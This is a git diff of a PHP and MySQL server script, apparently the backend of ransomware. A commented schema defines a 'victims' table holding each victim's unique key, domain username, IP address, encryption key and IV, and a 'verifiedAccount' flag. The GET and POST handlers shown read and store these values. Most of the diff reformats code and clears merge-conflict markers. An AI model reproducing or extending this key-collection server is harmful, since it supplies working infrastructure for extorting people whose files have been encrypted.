@@ -1,5 +1,5 @@
 ﻿<?php
-
+// Uncomment the following 2 lines for server-side debugging.
 // error_reporting(E_ALL);
 // ini_set("display_errors", "On");
 
@@ -12,21 +12,9 @@ define("db_password", "");
 $mysqli = new mysqli(db_server, db_username, db_password, db_name);
 
 // Check connection
-if ($mysqli->connect_error) {
-    // connection failed
-    die("Connection failed: " . $mysqli->connect_error);
-}
-// connected successfully
+if ($mysqli->connect_error) { die("Connection failed: " . $mysqli->connect_error); }
 
-<<<<<<< HEAD
-if ($_SERVER['REQUEST_METHOD'] == "GET" && isset($_GET['contact'])) {
-	echo "contact page opened.";
-}
-
-=======
->>>>>>> 6fcc16d2ff79ab9d63c859a18427cae02b6311ba
 if ($_SERVER['REQUEST_METHOD'] == "GET") {
-	// echo "Loaded through " . $_SERVER['REQUEST_METHOD'] ." request";
 	$verifiedAccount = false; // False by default to prevent leaks
 
 	if (isset($_GET['uniqueKey']) && isset($_GET['userDomUser'])) {
@@ -53,23 +41,20 @@ if ($_SERVER['REQUEST_METHOD'] == "GET") {
 	}
 
 } elseif ($_SERVER['REQUEST_METHOD'] == "POST") {
-<<<<<<< HEAD
-=======
-	// echo "Loaded through " . $_SERVER['REQUEST_METHOD'] . " request.";
->>>>>>> 6fcc16d2ff79ab9d63c859a18427cae02b6311ba
 
-/*
-CREATE TABLE victims (
-userID INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
-uniqueKey VARCHAR(12) NOT NULL,
-userDomUser VARCHAR(100) NOT NULL,
-userIPAddr VARCHAR(45) NOT NULL,
-encKey VARCHAR(500) NOT NULL,
-encIV VARCHAR(500) NOT NULL,
-verifiedAccount BOOLEAN NOT NULL DEFAULT 0,
-reqDate TIMESTAMP
-)
-*/
+	/*
+	CREATE TABLE victims (
+		userID INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
+		uniqueKey VARCHAR(12) NOT NULL,
+		userDomUser VARCHAR(100) NOT NULL,
+		userIPAddr VARCHAR(45) NOT NULL,
+		encKey VARCHAR(500) NOT NULL,
+		encIV VARCHAR(500) NOT NULL,
+		verifiedAccount BOOLEAN NOT NULL DEFAULT 0,
+		reqDate TIMESTAMP
+	)
+	*/
+
 	// let's set variables
 	$uniqueKey = htmlspecialchars($_POST["uniqueKey"]);
 	$userDomUser = htmlspecialchars($_POST["userDomUser"]);
